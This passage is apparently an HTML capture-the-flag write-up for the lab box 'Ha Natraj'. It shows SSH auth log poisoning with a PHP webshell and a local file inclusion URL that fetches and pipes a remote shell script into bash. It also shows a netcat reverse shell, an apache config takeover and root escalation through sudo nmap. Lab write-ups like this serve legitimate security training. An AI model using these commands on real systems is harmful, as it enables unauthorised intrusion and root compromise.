+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:28:01<span class="w"> </span>ubuntu<span class="w"> </span>CRON<span class="o">[</span><span class="m">24623</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>cron:session<span class="o">)</span>:<span class="w"> </span>session<span class="w"> </span>closed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>root
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:29:01<span class="w"> </span>ubuntu<span class="w"> </span>CRON<span class="o">[</span><span class="m">24626</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>cron:session<span class="o">)</span>:<span class="w"> </span>session<span class="w"> </span>opened<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>root<span class="w"> </span>by<span class="w"> </span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:29:01<span class="w"> </span>ubuntu<span class="w"> </span>CRON<span class="o">[</span><span class="m">24626</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>cron:session<span class="o">)</span>:<span class="w"> </span>session<span class="w"> </span>closed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>root
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:01<span class="w"> </span>ubuntu<span class="w"> </span>CRON<span class="o">[</span><span class="m">24629</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>cron:session<span class="o">)</span>:<span class="w"> </span>session<span class="w"> </span>opened<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>root<span class="w"> </span>by<span class="w"> </span><span class="o">(</span><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="o">)</span>
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:01<span class="w"> </span>ubuntu<span class="w"> </span>CRON<span class="o">[</span><span class="m">24629</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>cron:session<span class="o">)</span>:<span class="w"> </span>session<span class="w"> </span>closed<span class="w"> </span><span class="k">for</span><span class="w"> </span>user<span class="w"> </span>root
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:22<span class="w"> </span>ubuntu<span class="w"> </span>sshd<span class="o">[</span><span class="m">24632</span><span class="o">]</span>:<span class="w"> </span>Invalid<span class="w"> </span>user<span class="w"> </span>yaya<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.45.227<span class="w"> </span>port<span class="w"> </span><span class="m">56084</span>
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:24<span class="w"> </span>ubuntu<span class="w"> </span>sshd<span class="o">[</span><span class="m">24632</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>sshd:auth<span class="o">)</span>:<span class="w"> </span>check<span class="w"> </span>pass<span class="p">;</span><span class="w"> </span>user<span class="w"> </span>unknown
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:24<span class="w"> </span>ubuntu<span class="w"> </span>sshd<span class="o">[</span><span class="m">24632</span><span class="o">]</span>:<span class="w"> </span>pam_unix<span class="o">(</span>sshd:auth<span class="o">)</span>:<span class="w"> </span>authentication<span class="w"> </span>failure<span class="p">;</span><span class="w"> </span><span class="nv">logname</span><span class="o">=</span><span class="w"> </span><span class="nv">uid</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">euid</span><span class="o">=</span><span class="m">0</span><span class="w"> </span><span class="nv">tty</span><span class="o">=</span>ssh<span class="w"> </span><span class="nv">ruser</span><span class="o">=</span><span class="w"> </span><span class="nv">rhost</span><span class="o">=</span><span class="m">192</span>.168.45.227
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:26<span class="w"> </span>ubuntu<span class="w"> </span>sshd<span class="o">[</span><span class="m">24632</span><span class="o">]</span>:<span class="w"> </span>Failed<span class="w"> </span>password<span class="w"> </span><span class="k">for</span><span class="w"> </span>invalid<span class="w"> </span>user<span class="w"> </span>yaya<span class="w"> </span>from<span class="w"> </span><span class="m">192</span>.168.45.227<span class="w"> </span>port<span class="w"> </span><span class="m">56084</span><span class="w"> </span>ssh2
+Aug<span class="w"> </span><span class="m">18</span><span class="w"> </span><span class="m">11</span>:30:26<span class="w"> </span>ubuntu<span class="w"> </span>sshd<span class="o">[</span><span class="m">24632</span><span class="o">]</span>:<span class="w"> </span>Connection<span class="w"> </span>closed<span class="w"> </span>by<span class="w"> </span>invalid<span class="w"> </span>user<span class="w"> </span>yaya<span class="w"> </span><span class="m">192</span>.168.45.227<span class="w"> </span>port<span class="w"> </span><span class="m">56084</span><span class="w"> </span><span class="o">[</span>preauth<span class="o">]</span>
+</pre></div>
+</div>
+</section>
+<section id="lfi-to-rce-through-log-file-poisoning">
+<h2>LFI to RCE through log file poisoning<a class="headerlink" href="#lfi-to-rce-through-log-file-poisoning" title="Permalink to this heading">#</a></h2>
+<p>Uploading a php webshell into the ssh auth log</p>
+<div class="highlight-default notranslate"><div class="highlight"><pre><span></span>ssh &#39;&lt;?php echo system($_GET[&quot;cmd&quot;]); ?&gt;&#39;@192.168.185.80
+&lt;?php system($_GET[&quot;cmd&quot;]); ?&gt;@192.168.185.80&#39;s password:
+^C
+</pre></div>
+</div>
+<p>Using the webshell to trigger a staged reverse shell, this was a bit of a trial and error process as the box does not have curl, this ended up working with wget</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>wget<span class="w"> </span>-O-<span class="w"> </span>http://192.168.45.218:9090/shell.sh<span class="p">|</span>bash
+</pre></div>
+</div>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>curl<span class="w"> </span><span class="s1">&#39;http://192.168.168.80/console/file.php?file=../../../../../var/log/auth.log?cmd=wget%20-O-%20http://192.168.45.218:9090/shell.sh%7Cbash&#39;</span>
+</pre></div>
+</div>
+<p>www-data having sudoer’s rules looks a bit weird to me but ok. We can restart the apache daemon.</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>sudo<span class="w"> </span>-l
+sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>www-data<span class="w"> </span>on<span class="w"> </span>ubuntu:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User<span class="w"> </span>www-data<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>ubuntu:
+<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/systemctl<span class="w"> </span>start<span class="w"> </span>apache2
+<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/systemctl<span class="w"> </span>stop<span class="w"> </span>apache2
+<span class="w">    </span><span class="o">(</span>ALL<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/bin/systemctl<span class="w"> </span>restart<span class="w"> </span>apache2
+</pre></div>
+</div>
+</section>
+<section id="restart-the-server-as-mahakal">
+<h2>Restart the server as Mahakal<a class="headerlink" href="#restart-the-server-as-mahakal" title="Permalink to this heading">#</a></h2>
+<p>We also have access to modify the apache config</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ls<span class="w"> </span>-la<span class="w"> </span>/etc/apache2/apache2.conf
+-rwxrwxrwx<span class="w"> </span><span class="m">1</span><span class="w"> </span>root<span class="w"> </span>root<span class="w"> </span><span class="m">7254</span><span class="w"> </span>Aug<span class="w"> </span><span class="m">20</span><span class="w"> </span><span class="m">10</span>:36<span class="w"> </span>/etc/apache2/apache2.conf
+</pre></div>
+</div>
+<p>So let’s get a proper shell</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>┌──<span class="o">(</span>blnkn㉿Kolossus<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4242</span>
+listening<span class="w"> </span>on<span class="w"> </span><span class="o">[</span>any<span class="o">]</span><span class="w"> </span><span class="m">4242</span><span class="w"> </span>...
+connect<span class="w"> </span>to<span class="w"> </span><span class="o">[</span><span class="m">192</span>.168.45.218<span class="o">]</span><span class="w"> </span>from<span class="w"> </span><span class="o">(</span>UNKNOWN<span class="o">)</span><span class="w"> </span><span class="o">[</span><span class="m">192</span>.168.168.80<span class="o">]</span><span class="w"> </span><span class="m">54240</span>
+bash:<span class="w"> </span>cannot<span class="w"> </span><span class="nb">set</span><span class="w"> </span>terminal<span class="w"> </span>process<span class="w"> </span>group<span class="w"> </span><span class="o">(</span><span class="m">545</span><span class="o">)</span>:<span class="w"> </span>Inappropriate<span class="w"> </span>ioctl<span class="w"> </span><span class="k">for</span><span class="w"> </span>device
+bash:<span class="w"> </span>no<span class="w"> </span>job<span class="w"> </span>control<span class="w"> </span><span class="k">in</span><span class="w"> </span>this<span class="w"> </span>shell
+www-data@ubuntu:/var/www/html/console$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+&lt;ole$<span class="w"> </span>python3<span class="w"> </span>-c<span class="w"> </span><span class="s1">&#39;import pty;pty.spawn(&quot;/bin/bash&quot;)&#39;</span>
+www-data@ubuntu:/var/www/html/console$<span class="w"> </span>^Z
+<span class="o">[</span><span class="m">1</span><span class="o">]</span>+<span class="w">  </span>Stopped<span class="w">                 </span>nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4242</span>
+
+┌──<span class="o">(</span>blnkn㉿Kolossus<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$<span class="w"> </span>stty<span class="w"> </span>raw<span class="w"> </span>-echo
+
+┌──<span class="o">(</span>blnkn㉿Kolossus<span class="o">)</span>-<span class="o">[</span>~<span class="o">]</span>
+└─$
+nc<span class="w"> </span>-lvnp<span class="w"> </span><span class="m">4242</span>
+<span class="w">             </span>reset
+reset:<span class="w"> </span>unknown<span class="w"> </span>terminal<span class="w"> </span><span class="nb">type</span><span class="w"> </span>unknown
+Terminal<span class="w"> </span>type?<span class="w"> </span>screen
+www-data@ubuntu:/var/www/html/console$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">TERM</span><span class="o">=</span>screen
+www-data@ubuntu:/var/www/html/console$<span class="w"> </span><span class="nb">export</span><span class="w"> </span><span class="nv">SHELL</span><span class="o">=</span>bash
+www-data@ubuntu:/var/www/html/console$
+www-data@ubuntu:/var/www/html/console$
+</pre></div>
+</div>
+<p>Now we can use vim to modify the config to run the server as mahakal and restart the daemon</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># These need to be set in /etc/apache2/envvars</span>
+User<span class="w"> </span>mahakal
+Group<span class="w"> </span>mahakal
+</pre></div>
+</div>
+<p>Makahal can run nmap as root</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mahakal@ubuntu:/home/mahakal$<span class="w"> </span>sudo<span class="w"> </span>-l
+Matching<span class="w"> </span>Defaults<span class="w"> </span>entries<span class="w"> </span><span class="k">for</span><span class="w"> </span>mahakal<span class="w"> </span>on<span class="w"> </span>ubuntu:
+<span class="w">    </span>env_reset,<span class="w"> </span>mail_badpass,
+<span class="w">    </span><span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin<span class="se">\:</span>/snap/bin
+
+User<span class="w"> </span>mahakal<span class="w"> </span>may<span class="w"> </span>run<span class="w"> </span>the<span class="w"> </span>following<span class="w"> </span>commands<span class="w"> </span>on<span class="w"> </span>ubuntu:
+<span class="w">    </span><span class="o">(</span>root<span class="o">)</span><span class="w"> </span>NOPASSWD:<span class="w"> </span>/usr/bin/nmap
+</pre></div>
+</div>
+</section>
+<section id="nmap-privesc">
+<h2>Nmap privesc<a class="headerlink" href="#nmap-privesc" title="Permalink to this heading">#</a></h2>
+<p>nmap is a gtfo bin and the sudo line has no restrictions</p>
+<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>mahakal@ubuntu:/home/natraj$<span class="w"> </span><span class="nv">TF</span><span class="o">=</span><span class="k">$(</span>mktemp<span class="k">)</span>
+mahakal@ubuntu:/home/natraj$<span class="w"> </span><span class="nb">echo</span><span class="w"> </span><span class="s1">&#39;os.execute(&quot;/bin/sh&quot;)&#39;</span><span class="w"> </span>&gt;<span class="w"> </span><span class="nv">$TF</span>
+mahakal@ubuntu:/home/natraj$<span class="w"> </span>cat<span class="w"> </span><span class="nv">$TF</span>
+os.execute<span class="o">(</span><span class="s2">&quot;/bin/sh&quot;</span><span class="o">)</span>
+mahakal@ubuntu:/home/natraj$<span class="w"> </span>sudo<span class="w"> </span>nmap<span class="w"> </span>--script<span class="o">=</span><span class="nv">$TF</span><span class="w">                                                      </span>
+
+Starting<span class="w"> </span>Nmap<span class="w"> </span><span class="m">7</span>.60<span class="w"> </span><span class="o">(</span><span class="w"> </span>https://nmap.org<span class="w"> </span><span class="o">)</span><span class="w"> </span>at<span class="w"> </span><span class="m">2023</span>-08-18<span class="w"> </span><span class="m">12</span>:29<span class="w"> </span>PDT
+NSE:<span class="w"> </span>Warning:<span class="w"> </span>Loading<span class="w"> </span><span class="s1">&#39;/tmp/tmp.7IIkq3SoTy&#39;</span><span class="w"> </span>--<span class="w"> </span>the<span class="w"> </span>recommended<span class="w"> </span>file<span class="w"> </span>extension<span class="w"> </span>is<span class="w"> </span><span class="s1">&#39;.nse&#39;</span>.
+<span class="c1"># uid=0(root) gid=0(root) groups=0(root)</span>
+</pre></div>
+</div>
+</section>
+</section>
+
+        </article>
+      </div>
+      <footer>
+        
+        <div class="related-pages">
+          <a class="next-page" href="../sunset_decoy/sunset_decoy.html">
+              <div class="page-info">
+                <div class="context">
+                  <span>Next</span>
+                </div>
+                <div class="title">Sunset Decoy</div>
+              </div>
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+            </a>
+          <a class="prev-page" href="../pg.html">
+              <svg class="furo-related-icon"><use href="#svg-arrow-right"></use></svg>
+              <div class="page-info">
+                <div class="context">
+                  <span>Previous</span>
+                </div>
+                
+                <div class="title">Proving Grounds</div>
+                
+              </div>
+            </a>
+        </div>
+        <div class="bottom-of-page">
+          <div class="left-details">
+            <div class="copyright">
+                Copyright &#169; 2023, blnkn
+            </div>
+            Made with <a href="https://www.sphinx-doc.org/">Sphinx</a> and <a class="muted-link" href="https://pradyunsg.me">@pradyunsg</a>'s
+            
+            <a href="https://github.com/pradyunsg/furo">Furo</a>
+            
+          </div>
+          <div class="right-details">
+            
+          </div>
+        </div>
+        
+      </footer>
+    </div>
+    <aside class="toc-drawer">
+      
+      
+      <div class="toc-sticky toc-scroll">
+        <div class="toc-title-container">
+          <span class="toc-title">
+            On this page
+          </span>
+        </div>
+        <div class="toc-tree-container">
+          <div class="toc-tree">
+            <ul>
+<li><a class="reference internal" href="#">Ha Natraj</a><ul>
+<li><a class="reference internal" href="#enum">Enum</a></li>
+<li><a class="reference internal" href="#lfi">LFI</a></li>
+<li><a class="reference internal" href="#lfi-to-rce-through-log-file-poisoning">LFI to RCE through log file poisoning</a></li>
+<li><a class="reference internal" href="#restart-the-server-as-mahakal">Restart the server as Mahakal</a></li>
+<li><a class="reference internal" href="#nmap-privesc">Nmap privesc</a></li>
+</ul>
+</li>
+</ul>
+
+          </div>
+        </div>
+      </div>
+      
+      
+    </aside>
+  </div>
+</div><script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js?v=b3ba4146"></script>
+    <script src="../../_static/doctools.js?v=888ff710"></script>
+    <script src="../../_static/sphinx_highlight.js?v=4825356b"></script>
+    <script src="../../_static/scripts/furo.js?v=32e29ea5"></script>
+    </body>
+</html>
